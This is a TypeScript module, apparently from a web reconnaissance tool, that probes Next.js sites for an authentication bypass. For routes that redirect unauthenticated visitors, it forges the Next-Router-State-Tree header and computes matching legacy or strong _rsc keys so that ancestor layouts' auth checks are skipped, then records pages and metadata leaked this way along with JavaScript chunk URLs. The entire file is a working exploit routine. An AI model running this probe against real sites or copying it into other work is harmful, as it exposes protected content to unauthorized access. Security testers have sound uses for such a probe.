import { createHash } from "node:crypto";
import rawRequest from "../../exploit/utility/rawRequest.js";
import { runWithConcurrency } from "../../utility/concurrency.js";
import { printMsg, MSG } from "../../utility/printMsg.js";

/** Marker Next.js embeds in a Flight payload when a layout/page calls redirect(). */
const NEXT_REDIRECT_MARKER = "NEXT_REDIRECT";

export type LeafMode = "page" | "metadata-only";

/**
 * Builds the `Next-Router-State-Tree` header value: a URL-encoded FlightRouterState
 * claiming every segment in `ancestorSegments` is already client-rendered, with the
 * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
 * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
 * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`.
 */
export const buildStateTreeHeader = (ancestorSegments: string[], leafMode: LeafMode = "page"): string => {
    let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
    for (let i = ancestorSegments.length - 1; i >= 0; i--) {
        node = [ancestorSegments[i], { children: node }];
    }
    const tree = ["", { children: node }];
    return encodeURIComponent(JSON.stringify(tree));
};

/**
 * Strong `_rsc` cache-busting key: SHA-256 of the four cache-busting inputs, truncated to
 * 96 bits and base64url-encoded. Mirrors `computeCacheBustingSearchParam` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` — not a secret, any client can
 * compute it from headers it itself sends.
 */
export const computeStrongRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    const digest = createHash("sha256").update(input).digest();
    return digest.subarray(0, 12).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

/**
 * 32-bit djb2xor hash, as used by Next.js's legacy (non-cryptographic) cache-busting key.
 * Mirrors `djb2Hash` in `shared/lib/hash.ts`.
 */
const djb2Hash = (str: string): number => {
    let hash = 5381;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) + hash + str.charCodeAt(i)) & 0xffffffff;
    }
    return hash >>> 0;
};

/**
 * Legacy `_rsc` cache-busting key: `djb2Hash` of the same four inputs as
 * `computeStrongRscKey`, base36-encoded and truncated to 5 characters. Mirrors
 * `computeLegacyCacheBustingSearchParam`/`hexHash` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` / `shared/lib/hash.ts`. Cheaper
 * to compute than the strong key, and some Next.js builds accept it as a fallback when the
 * strong-key check fails (see `NEXT-RSC-002`) — no crypto required to probe with it first.
 */
export const computeLegacyRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    return djb2Hash(input).toString(36).slice(0, 5);
};

/** Ancestor-segment claims worth trying per candidate path: first segment only, and every segment but the leaf. */
export const buildAncestorAttempts = (pathSegments: string[]): string[][] => {
    if (pathSegments.length === 0) return [];
    const attempts: string[][] = [[pathSegments[0]]];
    const allButLeaf = pathSegments.slice(0, -1);
    if (allButLeaf.length > 0 && allButLeaf.join("/") !== attempts[0].join("/")) {
        attempts.push(allButLeaf);
    }
    return attempts;
};

/** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
export const containsNextRedirectMarker = (body: string): boolean => body.includes(NEXT_REDIRECT_MARKER);

/** Extracts `_next/static/chunks/*.js` (including Turbopack `~`-separated names) references from a Flight payload body. */
export const extractChunkPathsFromFlightBody = (body: string): string[] => {
    const matches = body.matchAll(/\/?_next\/static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
    return [...new Set([...matches].map((m) => m[0]))];
};

export interface RouterStateForgeResult {
    /** Page URLs where a forged full-content ancestor claim returned content without a NEXT_REDIRECT marker. */
    bypassedUrls: string[];
    /** Page URLs where only a metadata-only leaf claim succeeded (dynamic generateMetadata() output, not the full page body) — a distinct, narrower disclosure than `bypassedUrls`. */
    metadataOnlyBypassedUrls: string[];
    /** Bypassed URLs (from either mode above) where the cheap legacy _rsc key alone was accepted — a version/build-line fingerprint signal, since only builds with the legacy-key fallback path accept it. */
    legacyKeyAcceptedUrls: string[];
    /** New downloadable JS chunk URLs recovered from any bypassed Flight payload. */
    newJsUrls: string[];
}

const REQUEST_TIMEOUT_MS = 15000;

type RscKeyMode = "legacy" | "strong";

interface ForgeAttemptResult {
    success: boolean;
    body: string;
}

/** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
const attemptForge = async (
    candidateUrl: string,
    ancestors: string[],
    leafMode: LeafMode,
    keyMode: RscKeyMode,
    timeout: number
): Promise<ForgeAttemptResult> => {
    const stateTree = buildStateTreeHeader(ancestors, leafMode);
    const nextUrl = "/" + ancestors.join("/");
    const rscKey =
        keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);

    const forgedUrl = new URL(candidateUrl);
    forgedUrl.searchParams.set("_rsc", rscKey);

    const forged = await rawRequest(forgedUrl.toString(), {
        timeout,
        headers: {
            RSC: "1",
            "Next-Router-State-Tree": stateTree,
            "Next-Url": nextUrl,
        },
    });
    if (!forged) return { success: false, body: "" };

    const contentType = forged.headers["content-type"] ?? "";
    const success =
        forged.status === 200 && contentType.includes("text/x-component") && !containsNextRedirectMarker(forged.body);
    return { success, body: forged.body };
};

/**
 * Tries the cheap legacy key first (no SHA-256 needed); only computes and retries with the
 * strong key if the legacy attempt didn't succeed. Reports which key mode actually worked.
 */
const attemptForgeWithKeyFallback = async (
    candidateUrl: string,
    ancestors: string[],
    leafMode: LeafMode,
    timeout: number
): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout);
    if (legacy.success) return { ...legacy, keyMode: "legacy" };

    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout);
    return { ...strong, keyMode: "strong" };
};

/**
 * For each candidate page URL that redirects an unauthenticated request, retries as an
 * RSC fetch with a forged `Next-Router-State-Tree` claiming known ancestor segments are
 * already mounted. If Next.js skips re-executing that ancestor's layout component (see
 * js-recon-internal-docs#142), the response comes back 200 without a NEXT_REDIRECT
 * record — content a plain crawl would never see.
 *
 * Two leaf modes are tried per candidate: an ordinary `page` claim (full body disclosure)
 * first, and — only if every `page` attempt fails — a `metadata-only` claim, which can
 * still leak dynamic `generateMetadata()` output even where a full-body claim doesn't
 * cleanly apply (e.g. a tenant-scoped layout).
 */
const next_routerStateForge = async (
    candidateUrls: string[],
    threads: number,
    timeout: number = REQUEST_TIMEOUT_MS
): Promise<RouterStateForgeResult> => {
    const bypassedUrls: string[] = [];
    const metadataOnlyBypassedUrls: string[] = [];
    const legacyKeyAcceptedUrls: string[] = [];
    const newJsUrls: string[] = [];

    await runWithConcurrency(candidateUrls, threads, async (candidateUrl) => {
        let parsed: URL;
        try {
            parsed = new URL(candidateUrl);
        } catch {
            return;
        }
        const segments = parsed.pathname.split("/").filter(Boolean);
        if (segments.length === 0) return;

        // Only worth forging against routes that actually redirect an unauthenticated request.
        const baseline = await rawRequest(candidateUrl, { timeout });
        if (!baseline || baseline.status < 300 || baseline.status >= 400) return;

        const recordChunks = (body: string) => {
            for (const chunkPath of extractChunkPathsFromFlightBody(body)) {
                newJsUrls.push(
                    new URL(chunkPath.startsWith("/") ? chunkPath : `/${chunkPath}`, parsed.origin).toString()
                );
            }
        };

        const ancestorAttempts = buildAncestorAttempts(segments);

        let bypassed = false;
        for (const ancestors of ancestorAttempts) {
            const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, "page", timeout);
            if (result.success) {
                printMsg(
                    MSG.Run,
                    `[✓] Forged next-router-state-tree bypass revealed content: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")}, ${result.keyMode} _rsc key)`
                );
                bypassedUrls.push(candidateUrl);
                if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
                recordChunks(result.body);
                bypassed = true;
                break; // one successful ancestor claim per candidate is enough
            }
        }
        if (bypassed) return;

        for (const ancestors of ancestorAttempts) {
            const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, "metadata-only", timeout);
            if (result.success) {
                printMsg(
                    MSG.Run,
                    `[✓] Forged metadata-only next-router-state-tree bypass revealed metadata: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")}, ${result.keyMode} _rsc key)`
                );
                metadataOnlyBypassedUrls.push(candidateUrl);
                if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
                recordChunks(result.body);
                break;
            }
        }
    });

    return {
        bypassedUrls: [...new Set(bypassedUrls)],
        metadataOnlyBypassedUrls: [...new Set(metadataOnlyBypassedUrls)],
        legacyKeyAcceptedUrls: [...new Set(legacyKeyAcceptedUrls)],
        newJsUrls: [...new Set(newJsUrls)],
    };
};

export default next_routerStateForge;
